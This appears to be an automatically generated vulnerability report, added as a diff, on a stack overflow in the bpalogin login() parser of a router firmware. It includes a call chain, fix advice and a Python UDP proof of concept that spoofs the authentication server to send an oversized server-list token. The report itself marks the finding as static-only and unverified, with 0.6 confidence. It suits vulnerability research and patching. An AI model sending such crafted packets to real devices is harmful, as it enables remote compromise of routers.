@@ -1,0 +1,43 @@
+# 漏洞挖掘报告
+
+## 一、任务信息
+
+- 会话：s-mt4k9rm7-b8ed
+- 任务：沿高分攻击路径做动静结合挖掘，给出调用链和可复现 PoC。优先命令注入和内存破坏。
+- 引擎：dsh（模式：dynamic）
+- 固件任务：3a1f3c822c22
+- 报告时间：2026-08-22T17:57:32Z
+
+## 二、发现统计
+
+- 共 1 个漏洞：高危 1 个
+
+## 三、漏洞详情
+
+### 漏洞 1：bpalogin login() 登录响应 server-list 字段解析栈缓冲区溢出（远程 UDP 可触发）（F-mt4ljkg4-bede）
+
+- **漏洞类型**：stack overflow（CWE-121）
+- **危害等级**：高危（置信度 0.6）
+- **影响组件**：firmware/binwalk_extracted/firmware.extracted/100000/squashfs-root/usr/sbin/bpalogin（md5: f8a1d1f62eef2e1e73cbbeadd5d51900）
+- **漏洞位置**：login @ 0x401ab8
+- **可达性**：static-only
+- **漏洞描述**：bpalogin（IN-002，公网 UDP 输入）在 login() 登录交易处理中解析服务端返回的 server-list 字段（字段号 0x16）。extract_valuestring(0x402bb8) 以报文内 16 位长度字为拷贝长度，无任何上限校验，memcpy(a4, v11, v13-4) 直接将报文值拷入目标；随后 login() 用 strcspn 按 " ," 分词，strncpy(v34, v14, v18) 将任意长度（>200 字节）的 token 写入栈缓冲 char v34[200]（sp+38h），随后 v34[v19]=0 越界写。攻击者处于认证服务器路径（UDP 可伪造/中间人）即可在 bpalogin 启动登录流程时触发栈溢出，覆盖相邻局部变量与返回地址。固件工具链所有 MIPS 程序均无堆栈 canary（manifest.json 全部 canary=false），本机 no-NX/no-PIE，具备直接 RCE 条件。
+- **漏洞证据**：
+  1. bpalogin md5=f8a1d1f62eef2e1e73cbbeadd5d51900 path=usr/sbin/bpalogin (IN-002 公网 UDP 输入)
+  2. login @0x401ab8: extract_valuestring(a1, v35, 0x16u, (char*)(a1+1174)) 后用 strcspn(v14," ,") 得到 token 长度 v18，strncpy(v34, v14, v18) + v34[v19]=0 写入栈缓冲 char v34[200]
+  3. extract_valuestring @0x402bb8: v13=(u16)(v11-1 + (v11-2)<<8); memcpy(a4, v11, v13-4) 长度完全来自报文字段长度字，无目标容量校验
+  4. mainloop @0x401010 中直接调用 login(a1)（if (!login(a1))），main @0x40482c 调用 mainloop
+  5. manifest.json: 全部 MIPS 二进制 canary=false, nx=false, pie=false（uClibc 0.9.30 工具链）
+  6. 动态说明: qemu 差分仅能覆盖 HTTP 类（httpd 两次 trace ef55266d1f34/2ba400f78c44 均为 0 差分+连接重置，harness 无法驱动），UDP 报文触发无法用现 harness 验证；afl-qemu 持久化 hook 编译失败（fz-2f3b8931），故本项为 static-only
+
+**调用链**：
+
+main(0x40482c) → mainloop(0x401010) → login(0x401ab8) → receive_transaction → extract_valuestring(0x402bb8, 字段0x16, 目标 a1+1174) → strcspn(" ,") → strncpy(v34[200], v14, v18) → v34[v18]=0 越界写 → 栈溢出
+
+**漏洞 PoC**：
+
+```
+UDP 伪造认证服务器向 bpalogin 回交（响应端口为客户端源端口）。交易格式：u16 type + u16 total_len + 记录序列（每条 u16 ftype + u16 flen + 数据(flen-4)）。触发序列(3 次响应)：\n1) type=2 (T_MSG_PROTOCOL_NEG_RESP): fields 0x000A status=0(flen6), 0x0018 ver字符串(flen6), 0x0002 proto=1(flen6)\n2) type=9 (T_MSG_AUTH_RESP): fields 0x000E hashmethod=1(flen6), 0x000C nonce=\"AAAA\"(flen8)\n3) type=5 (T_MSG_LOGIN_RESP): field 0x000A status=0(flen6)；field 0x0016 flen=4+264, data='A'*264（>200 字节 token，无空格/逗号）→ login() 中 strncpy(v34[200], 'A'*264, 264) 溢出栈\nPython 示意：\nimport socket,struct\ns=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)\naddr=('192.168.1.1', 55222)  # bpalogin 源端口\nfld=lambda t,d: struct.pack('>HH',t,4+len(d))+d\nrsp=lambda t,fs: struct.pack('>HH',t,8+sum(len(fs[i][1]) for i in range(len(fs))))+b''.join(fld(*f) for f in fs)\ns.sendto(rsp(2,[(0x000A,struct.pack('>H',0)),(0x0018,b'v1'),(0x0002,struct.pack('>H',1))]),addr)\ns.sendto(rsp(9,[(0x000E,struct.pack('>H',1)),(0x000C,b'AAAA')]),addr)\ns.sendto(rsp(5,[(0x000A,struct.pack('>H',0)),(0x0016,b'A'*264)]),addr)
+```
+
+- **修复建议**：1) extract_valuestring/extract_valueINT2 增加目标缓冲长度参数，拒绝超过目标容量的字段；2) login() 中对每个 server-list token 用 v18 与 sizeof(v34) 比较，超长即跳过/报错；3) 20 字节槽 strcpy 改为 strncpy(i+20*cnt, v34, 20)；4) 为 bpalogin 启用堆栈 canary 与 NX。
